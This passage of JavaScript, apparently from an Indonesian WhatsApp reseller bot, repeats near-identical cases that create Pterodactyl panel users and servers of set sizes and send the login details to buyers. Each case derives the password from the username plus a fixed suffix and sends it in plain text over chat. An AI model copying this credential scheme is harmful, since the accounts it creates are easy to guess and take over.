if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "20GB"
let egg = global.eggsnya
let loc = global.location
let memo = "20240"
let cpu = "530"
let disk = "20240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "35gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "35GB"
let egg = global.eggsnya
let loc = global.location
let memo = "35240"
let cpu = "1060"
let disk = "35240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "34gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "34GB"
let egg = global.eggsnya
let loc = global.location
let memo = "34240"
let cpu = "1010"
let disk = "34240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "33gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "33GB"
let egg = global.eggsnya
let loc = global.location
let memo = "33240"
let cpu = "1000"
let disk = "33240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "32gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "32GB"
let egg = global.eggsnya
let loc = global.location
let memo = "32240"
let cpu = "980"
let disk = "32240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "31gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "31GB"
let egg = global.eggsnya
let loc = global.location
let memo = "31240"
let cpu = "960"
let disk = "31240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "30gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "30GB"
let egg = global.eggsnya
let loc = global.location
let memo = "30240"
let cpu = "910"
let disk = "30240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "29gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "29GB"
let egg = global.eggsnya
let loc = global.location
let memo = "29240"
let cpu = "880"
let disk = "29240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "28gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "28GB"
let egg = global.eggsnya
let loc = global.location
let memo = "28240"
let cpu = "860"
let disk = "28240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "27gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "27GB"
let egg = global.eggsnya
let loc = global.location
let memo = "27240"
let cpu = "810"
let disk = "27240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
